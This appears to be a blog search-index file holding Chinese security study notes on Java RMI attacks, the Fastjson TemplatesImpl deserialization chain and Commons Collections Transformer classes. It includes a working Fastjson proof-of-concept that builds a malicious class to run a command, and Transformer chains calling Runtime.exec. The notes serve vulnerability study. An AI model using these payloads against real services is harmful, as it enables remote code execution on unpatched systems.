<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java RMI</title>
    <link href="/2021/11/27/Java-RMI/"/>
    <url>/2021/11/27/Java-RMI/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-RMI学习"><a href="#Java-RMI学习" class="headerlink" title="Java RMI学习"></a>Java RMI学习</h1><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI(Rmote Method Invoke) 远程方法调用，客户端远程调用服务端上的方法，JVM虚拟机可以调用另外一个JVM虚拟机中的方法，但是客户端并不止直接调用服务器上的方法而是借助存根(stub)充当客户端的代理来访问服务前，同时骨架(Skeleton)是另一个代理，他与真实的对象在服务端上，骨架(Skeleton)将接受到的请求交给服务器来处理，服务器处理完成之后将结果进行打包发送到存根(stub)，然后存根(stub)将结果进行解包发送给客户端。</p><p>RMI在数据传输中的对象必须实现 Serializable 接口，因为传输中都是进行序列化进行传输并且客户端的serialVersionUID字段要与服务端保持一致</p><p>RMI主要的三个部分</p><ol><li>RMI Registry 注册表</li><li>RMI Server 服务端</li><li>RMI Client 客户端</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127155400956.png" alt="image-20211127155400956"></p><p>首先我们的RMI Client 会远程连接RMI Registry(默认端口是1099)，然后再 Registry 寻找名字为 Test 的对象(假设此时客户端要调用Test对象的某个方法)，Registry 会寻找对应名字的远程对象引用，并且序列化后进行返回(数据内同就是远程对象的地址，返回的对象就是存根stub)，客户端再接受到之后首先会在本机中的classpath进行查找，如果没有找到则说明是远程对象，客户端就会与远程地址进行tcp连接</p><h2 id="RMI-Demo"><a href="#RMI-Demo" class="headerlink" title="RMI Demo"></a>RMI Demo</h2><p><strong>服务端</strong></p><ol><li><p>编写一个实现 Remote 的接口</p></li><li><p>编写一个继承 UnicastRemoteObject 的接口实现类</p><blockquote><p>远程对象的实现类必须继承自UnicastRemoteObject，只有继承了才能表示该类是一个远程对象，如果不继承就需要手动调用类的exportObject静态方法</p></blockquote></li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127163054531.png" alt="image-20211127163054531"></p><p><strong>客户端</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRmi</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException, MalformedURLException </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            RMITestInterface rt = (RMITestInterface) Naming.lookup(<span class="hljs-string">&quot;rmi://192.168.148.180:1099/hello&quot;</span>);<br>            String result = rt.Hello();<br>            String result1 = rt.Test();<br>            System.out.println(result1);<br>            String[] s = Naming.list(<span class="hljs-string">&quot;rmi://192.168.148.180:1099&quot;</span>);<br>            <span class="hljs-keyword">for</span>(String a : s)&#123;<br>                System.out.println(a);<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMI通信"><a href="#RMI通信" class="headerlink" title="RMI通信"></a>RMI通信</h2><p>利用Wireshark抓取数据包</p><p>Cilent 会向 Registry 发出一个 Call 请求，然后Registry 会返回一个ReturnData，ReturnData中会包含目标的IP地址等信息(信息都是反序列化的)</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127165934540.png" alt="image-20211127165934540"></p><p>客户端在获取到了远程服务器的地址和端口号之后，会和Server进行一次tcp连接，所以整个过程RMI通信流程中进行了两次TCP连接</p><p>第一次会Registry建立一次TCP连接，Registry会返回一个stub</p><p>第二次获取到Server的地址后，利用stub调用远程方法进行第二次tcp连接，所以方法调用就是在第二次的tcp连接中   </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127165221163.png" alt="image-20211127165221163"></p><h2 id="RMI的序列化与反序列化"><a href="#RMI的序列化与反序列化" class="headerlink" title="RMI的序列化与反序列化"></a>RMI的序列化与反序列化</h2><p>RMI由于是序列化传输的所以就会有很多的安全问题，通常RMI Registry的默认端口就是109，当我们可以访问到RMI Registry的情况下可以做什么？</p><ol><li><p><del>绑定恶意对象</del>，只有源地址是localhost的时候才能调用rebind bind unbind方法，但是我们可以使用list和lookup方法</p><blockquote><p>String[] s = Naming.list(“rmi://192.168.148.180:1099”); 列出绑定的对象</p><p>lookup 获取某个远程对象</p></blockquote></li><li><p>利用RMI服务器上存在的恶意方法执行命令，首先可以通过list列出所有对象引用，然后只要目标服务器上存在一些危险方法，我们就可以通过RMI对其进行调用。危险方法探测工具： <a href="https://github.com/NickstaDB/BaRMIe">https://github.com/NickstaDB/BaRMIe</a></p></li></ol><h2 id="RMI-利用codebase-执行任意命令"><a href="#RMI-利用codebase-执行任意命令" class="headerlink" title="RMI 利用codebase 执行任意命令"></a>RMI 利用codebase 执行任意命令</h2><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>如果我们指定 codebase=<a href="http://example.com/">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，则 Java虚拟机会下载这个文件 <a href="http://example.com/org/vulhub/example/Example.class">http://example.com/org/vulhub/example/Example.class</a> ，并作为 Example类的字节码。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，在对象反序列化时就会去寻找类，如果某一端反序列化时发现一个对象，你们就会去自己的CLASSPATH下寻找相对应的类；如果在本地没有找到这个类，它就回去远程加载codebase中的类。</p><p>如果将codebase指定为我们的恶意地址这样就很有可能造成危害，如果将codebase指向地址上的类改为Server请求的同名文件，那么Server就会加载我们的恶意类从而造成命令执行</p><p>满足以下条件的RMI服务器才会被攻击</p><ul><li><p>安装并配置 SecurityManager</p></li><li><p>java 版本低于7u21 6u45 或者设置了java.rmi.server.useCodebaseOnly=false</p><blockquote><p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。</p></blockquote></li></ul><p>具体操作可以查看P神的代码审计</p><blockquote><p>弄了好久没有复现成功不知道哪里出了错误…………</p></blockquote><p>就先暂时学到这里啦以后慢慢积累吧</p><p>参考文章</p><p>P神代码审计</p><p><a href="http://wjlshare.com/archives/1522">http://wjlshare.com/archives/1522</a></p><p><a href="https://y4er.com/post/java-rmi/">https://y4er.com/post/java-rmi/</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FastJason TemplatesImpl利用链分析</title>
    <link href="/2021/11/27/FastJason/"/>
    <url>/2021/11/27/FastJason/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson-TemplatesImpl利用链分析"><a href="#Fastjson-TemplatesImpl利用链分析" class="headerlink" title="Fastjson TemplatesImpl利用链分析"></a>Fastjson TemplatesImpl利用链分析</h1><blockquote><p>1.2.22-1.2.24</p></blockquote><p>FastJson是阿里巴巴开源的一个json库，能够快速的进行序列化和反序列化。</p><p>Fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞，之后的版本引入了autoType的黑白名单机制。在Fastjson 1.2.22 — 1.2.24 版本的反序列化漏洞利用，主要有以下两种已知利用链</p><ul><li>TemplateImpl</li><li>JNDI</li></ul><p><strong>限制条件</strong></p><p><code>Feature.SupportNonPublicField</code> 需要开启，因为<code>_bytecodes</code> 和 <code>_outputProperties</code> 两个关键属性是私有的</p><h2 id="了解FastJson"><a href="#了解FastJson" class="headerlink" title="了解FastJson"></a>了解FastJson</h2><p>这里简单的写了一个测试类，发现 fastjson 在将对象序列化为json字符串时会自动调用类的getter函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126105700947.png" alt="image-20211126105700947"></p><p>序列化：<code>JSON.toJSONString()</code></p><p>反序列化：<code>JSON.parseObject()</code> <code>JSON.parse()</code></p><blockquote><p>这的两种反序列化方法返回的对象不一样</p><p><code>JSON.parseObject()</code>返回的是 <code>fastjson.JSONObject</code> 类</p><p><code>JSON.parse()</code>返回的是原本的类 例如上面的：<code>User</code></p></blockquote><p><strong>@type</strong></p><p>在 FastJson 中有一个 @type 参数，它可以将我们反序列化后的类转化为 @type 中指定的类，然后自动调用类中的 setter getter 和 构造函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126115559566.png" alt="image-20211126115559566"></p><blockquote><p>这里对于调用到 getter 我们可以联想到使用的 CommonsBeanutils 中的调用到 TemlatesImpl 类的getOutputProperties()</p></blockquote><p><strong>Feature.SupportNonPublicField</strong></p><p>由于该字段是在fastjson 1.2.22 版本引入的，所以该漏洞只影响到 1.2.22-1.2.24</p><p>如果 @type 使用的类的变量是 private 这里 json 反序列化时就不能够直接赋值了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126154941458.png" alt="image-20211126154941458"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126155027140.png" alt="image-20211126155027140"></p><p>所以说当在json反序列化时加上<code>Feature.SupportNonPublicField</code>就可以直接给私有变量赋值</p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>这里可以参考 <a href="http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/#TemplatesImpl">http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/#TemplatesImpl</a> 动态加载字节码与<a href="http://lcdm123.xyz/2021/11/17/Java-CommonsBeanutils1/">http://lcdm123.xyz/2021/11/17/Java-CommonsBeanutils1/</a> CommonsBeanutils1的链子原理</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126211813555.png" alt="image-20211126211813555"></p><p>在 TemplatesImpl 中的变量都是私有的，所以如果需要使用它来构造 payload 就需要加上 Feature.SupportNonPublicField</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126214338995.png" alt="image-20211126214338995"></p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">generateEvilCode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException </span>&#123;<br><br>        ClassPool pool = ClassPool.getDefault();<br>        CtClass clazz = pool.makeClass(<span class="hljs-string">&quot;org.lcdm123.test&quot;</span>);<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String cmd = <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        clazz.makeClassInitializer().insertBefore(cmd);<br>        clazz.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));<br>        clazz.writeFile();<br><br>        <span class="hljs-keyword">byte</span>[] bytes = clazz.toBytecode();<br>        String EvilCode = Base64.getEncoder().encodeToString(bytes);<br>        System.out.println(EvilCode);<br>        <span class="hljs-keyword">return</span> EvilCode;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException </span>&#123;<br>        <span class="hljs-keyword">final</span> String gadget = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        String Evil = POC1.generateEvilCode();<br>        String PoC = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + gadget + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + Evil + <span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;lcdm123&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;lcdm123\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;<br>        JSON.parseObject(PoC, Object.class, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211126233614402.png" alt="image-20211126233614402"></p><h2 id="为什么这么构造"><a href="#为什么这么构造" class="headerlink" title="为什么这么构造"></a>为什么这么构造</h2><ol><li><p><code>_bytecodes</code> 为什么需要 Base64 编码</p><p><code>\com\alibaba\fastjson\parser\deserializer\DefaultFieldDeserializer.class</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127000733271.png" alt="image-20211127000733271"></p><p><code>\com\alibaba\fastjson\1.2.24\fastjson-1.2.24.jar!\com\alibaba\fastjson\serializer\ObjectArrayCodec.class</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127000809456.png" alt="image-20211127000809456"></p><p><code>\com\alibaba\fastjson\parser\JSONScanner.class</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127000859642.png" alt="image-20211127000859642"></p><p>在执行的时候这里会进行一次base64解码操作</p></li><li><p><code>&#39;_tfactory&#39;:&#123;&#125;</code></p><p>在 <code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class</code>中解析字段的时候，会自动判断传入的键值是否为空，如果为空就会根据类的属性定义的类型创建实例</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127005014851.png" alt="image-20211127005014851"></p></li><li><p>为什么会调用到TemplatesImpl的<code>getOutputProperties()</code> 函数</p><p><code>\com\alibaba\fastjson\util\JavaBeanInfo.class </code>的<code>build()</code>中</p><p>在通过<code>@type</code>拿到类之后，会通过反射的方法拿到类中所有的方法，然后遍历方法获取到get与set方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127131135302.png" alt="image-20211127131135302"></p><p>调用set方法的地方</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127132813388.png" alt="image-20211127132813388"></p><p>如果需要进入到上面的代码，就需要满足下面的if中的条件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127132927380.png" alt="image-20211127132927380"></p><ol><li>方法名的长度大于四</li><li>不是静态方法</li><li>放回值为void或当前类</li><li>方法名以set开头</li><li>只有一个参数</li></ol><p>当满足条件之后会从方法名截取属性名，如果截取时遇到<code>_</code>就会跳过它截取后面的。例如<code>set_name</code>会截取到<code>name</code>属性</p><p>当截取完但是找不到这个属性时，会判断第一个参数的类型是否为布尔型，是的话就会在截取完的便两千加上<code>is</code>截取,截取 propertyName 的第一个字符(转大写)和第二个字符，并且然后重新尝试获取属性字段。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211127134744687.png" alt="image-20211127134744687"></p></li></ol><p>   get方法的调用也是类似的</p><p>   <img src="https://gitee.com/lcdm123/image/raw/master/image-20211127134919505.png" alt="image-20211127134919505"></p><p>   判断中的要求就是</p><ol><li><p>方法名长度大于等于4</p></li><li><p>不是静态方法</p></li><li><p>以get开头并且第4个字母为大写</p></li><li><p>没有传入参数</p></li><li><p>返回值类型继承Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</p><p>当程序绑定了对应的字段之后，传入图的json字符串中的键值存在这个值时就会去调用对应的setter 构造方法</p></li></ol><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方的修复方法主要就是利用了黑名单和白名单，对于后面版本的链子就是靠的绕过来构造的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看了好久才对这个漏洞似懂非懂还需要在后面的学习中慢慢理解和学习</p><p>参考文章</p><p><a href="http://wjlshare.com/archives/1512">http://wjlshare.com/archives/1512</a></p><p><a href="https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/">https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/</a></p><p><a href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#set%E6%96%B9%E6%B3%95">https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#set%E6%96%B9%E6%B3%95</a></p><p><a href="https://www.freebuf.com/vuls/178012.html">https://www.freebuf.com/vuls/178012.html</a></p><p><a href="https://y4er.com/post/fastjson-learn/">https://y4er.com/post/fastjson-learn/</a></p><p><a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Transformer分析</title>
    <link href="/2021/11/25/Transformer%E5%88%86%E6%9E%90/"/>
    <url>/2021/11/25/Transformer%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Transformer-家族分析"><a href="#Transformer-家族分析" class="headerlink" title="Transformer 家族分析"></a>Transformer 家族分析</h1><blockquote><p>之前将 CC 链的部分过了一下，但是发现对于其中利用到一些列Tranformer相关的类理解得不是很透彻，所以这里重新学习一下</p></blockquote><h2 id="了解相关类"><a href="#了解相关类" class="headerlink" title="了解相关类"></a>了解相关类</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Transformer</span> </span>&#123;<br>    <span class="hljs-function">Object <span class="hljs-title">transform</span><span class="hljs-params">(Object var1)</span></span>;<br>&#125;<br><span class="hljs-comment">// 接口中定义了一个 transform 方法，参数为一个对象，返回值也是对象</span><br></code></pre></td></tr></table></figure><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>实现了 Transformer 接口，调用 transform 函数时会返回构造函数中传入的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.iConstant = constantToReturn;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.iConstant;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>InvokerTransformer 中的 transform 方法利用了反射的原理，通过反射调用我们传入类中的方法，这里就是整个利用链的关键点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.iMethodName = methodName;<br>        <span class="hljs-keyword">this</span>.iParamTypes = paramTypes;<br>        <span class="hljs-keyword">this</span>.iArgs = args;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 反射调用执行函数</span><br>            Class cls = input.getClass();<br>            Method method = cls.getMethod(<span class="hljs-keyword">this</span>.iMethodName, <span class="hljs-keyword">this</span>.iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, <span class="hljs-keyword">this</span>.iArgs);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var6) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var7) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, var7);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>在构造函数中获取一个数组, transform 函数就是将构造函数中传入的数组按顺序执行他们的 transform 函数，上一次执行的结果会传入下一次的参数当中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.iTransformers = transformers;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>.iTransformers.length; ++i) &#123;<br>        object = <span class="hljs-keyword">this</span>.iTransformers[i].transform(object);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用链中 ChainedTransformer 就负责将各类串联起来</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125135808173.png" alt="image-20211125135808173"></p><h2 id="使用分析"><a href="#使用分析" class="headerlink" title="使用分析"></a>使用分析</h2><h3 id="InvokerTransformer-1"><a href="#InvokerTransformer-1" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>直接使用 InvokerTransformer 执行时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">String method = <span class="hljs-string">&quot;exec&quot;</span>;<br>        Class[] paramTypes = <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;;<br>        Object[] arg = <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;;<br>        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(method,paramTypes,arg);<br>        Object runTime = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>));<br>        invokerTransformer.transform(runTime);<br></code></pre></td></tr></table></figure><p>简单的根据构造函数创建一个 InvokerTransformer 类对象，然后执行该类对象的 transformer 函数</p><blockquote><ol><li>invoke调用普通方法时，传入的必须是实例化后的类</li><li>invoke调用静态方法时，传入类即可</li></ol></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125142134936.png" alt="image-20211125142134936"></p><p>利用 ChainedTransformer 将多个实现 Transformer 接口的类串联起来，并且依次调用其中的 transformer 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(<span class="hljs-number">111</span>);<br></code></pre></td></tr></table></figure><figure 